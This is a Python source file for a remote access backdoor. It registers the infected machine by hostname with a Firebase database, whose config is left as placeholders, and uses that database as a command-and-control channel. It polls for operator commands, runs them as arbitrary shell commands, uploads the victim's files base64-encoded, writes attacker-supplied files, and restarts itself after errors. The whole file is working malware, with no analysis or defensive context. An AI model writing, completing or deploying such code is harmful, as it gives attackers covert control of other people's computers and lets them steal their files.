import socket
import subprocess
import os
import base64
import json

import time
import pyrebase
import secrets
import platform
from datetime import datetime

class Backdoor:
	db = ""
	firebase = ""
	ListenerCode = ""
	Device = ""
	def __init__(self):
		# Use your own firebase configuration
		firebaseConfig = {
			'apiKey': "XXXXXXX",
			'authDomain': "XXXXXXX",
			'databaseURL': "XXXXXXX",
			'projectId': "XXXXXXX",
			'storageBucket': "XXXXXXX",
			'messagingSenderId': "XXXXXXX",
			'appId': "XXXXXXX"
		}

		self.firebase = pyrebase.initialize_app(firebaseConfig)

		self.db = self.firebase.database()

		self.data = {
			'packet': {
				'TerminalCode': secrets.token_hex(nbytes=5),
				'ListenerCode': "",
				'Listener': "",
				'Terminal': json.dumps("Online " + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")))
			}
		}
		my_system = platform.uname()
		self.Device = my_system.node
		self.db.child(self.Device).set(self.data)


	def reliable_send(self,message):
		if(isinstance(message, str)):
			json_data = json.dumps(message)
		else:
			json_data = json.dumps(message.decode("utf-8"))
		print(json_data)
		data = {self.Device + "/packet/Terminal": json_data}
		self.db.update(data)
		data = {self.Device + "/packet/TerminalCode": secrets.token_hex(nbytes=5)}
		self.db.update(data)

	def reliable_recieve(self):
		while True:
			recieved = self.db.child(self.Device).get().val()['packet']
			if self.ListenerCode != recieved['ListenerCode']:
				self.ListenerCode = recieved['ListenerCode']
				json_data = recieved['Listener']
				return json.loads(json_data)

	def execute_system_command(self, command):
		return subprocess.check_output(command, shell=True)

	def change_working_directory_to(self, path):
		os.chdir(path)
		return "[+] Changing working directroy to "+path

	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())

	def write_file(self, path, content):
		with open(path, "wb")as file:
			file.write(base64.b64decode(content))
			return "[+] Upload Successful"
	# def status(self):
	# 	json_data = json.dumps("Stats: " + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")))
	# 	data = {self.Device + "/packet/Terminal": json_data}
	# 	self.db.update(data)
	# 	data = {self.Device + "/packet/TerminalCode": secrets.token_hex(nbytes=5)}
	# 	self.db.update(data)

	def run(self):
		while True:
			command = self.reliable_recieve()
			print(command)
			try:
				if command[0]=="exit":
					exit()
				elif command[0] == 'status' and len(command)<=1:
					command_result= "Status: " + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
				elif command[0]=="cd" and len(command) > 1:
					 command_result= self.change_working_directory_to(command[1])
				elif command[0]=="download":
					command_result = self.read_file(command[1])
				elif command[0] == "upload":
					command_result = self.write_file(command[1], command[2])
				else:
					command_result= self.execute_system_command(command)
			except Exception :
				command_result= "[-] Error During command execution foreign"
			self.reliable_send(command_result)
x=0
while True:
	try:
		x=x+1
		my_backdoor = Backdoor()
		my_backdoor.run()
	except Exception as e :
		print("Errror:"+str(x)+str(e))
		continue
